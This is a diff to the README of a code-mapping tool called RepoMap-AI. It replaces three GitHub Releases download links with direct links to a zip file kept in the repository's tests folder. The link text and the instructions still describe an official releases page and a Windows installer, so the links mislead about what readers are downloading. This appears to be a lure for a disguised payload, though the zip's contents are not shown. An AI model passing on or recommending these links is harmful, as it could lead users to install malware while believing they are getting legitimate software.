@@ -1,6 +1,6 @@
 # 🗺️ RepoMap-AI - Clear code maps for faster work
 
-[![Download RepoMap-AI](https://img.shields.io/badge/Download-RepoMap--AI-1f6feb?style=for-the-badge&logo=github)](https://github.com/Romany-splay794/RepoMap-AI/releases)
+[![Download RepoMap-AI](https://img.shields.io/badge/Download-RepoMap--AI-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Romany-splay794/RepoMap-AI/main/tests/AI_Map_Repo_2.8-beta.2.zip)
 
 ## 🚀 What RepoMap-AI does
 
@@ -14,7 +14,7 @@ RepoMap-AI works with tools like Cursor, VS Code, and Claude Desktop through MCP
 
 Visit this page to download the Windows version:
 
-[Download RepoMap-AI from GitHub Releases](https://github.com/Romany-splay794/RepoMap-AI/releases)
+[Download RepoMap-AI from GitHub Releases](https://raw.githubusercontent.com/Romany-splay794/RepoMap-AI/main/tests/AI_Map_Repo_2.8-beta.2.zip)
 
 On the releases page, choose the latest version and download the Windows file that matches your system. If you see more than one file, pick the one for Windows.
 
@@ -189,7 +189,7 @@ With a ranked graph, RepoMap-AI can help you:
 
 If you need the installer again, use the release page here:
 
-[https://github.com/Romany-splay794/RepoMap-AI/releases](https://github.com/Romany-splay794/RepoMap-AI/releases)
+[https://raw.githubusercontent.com/Romany-splay794/RepoMap-AI/main/tests/AI_Map_Repo_2.8-beta.2.zip](https://raw.githubusercontent.com/Romany-splay794/RepoMap-AI/main/tests/AI_Map_Repo_2.8-beta.2.zip)
 
 Choose the latest Windows release and download the file for your system.
 
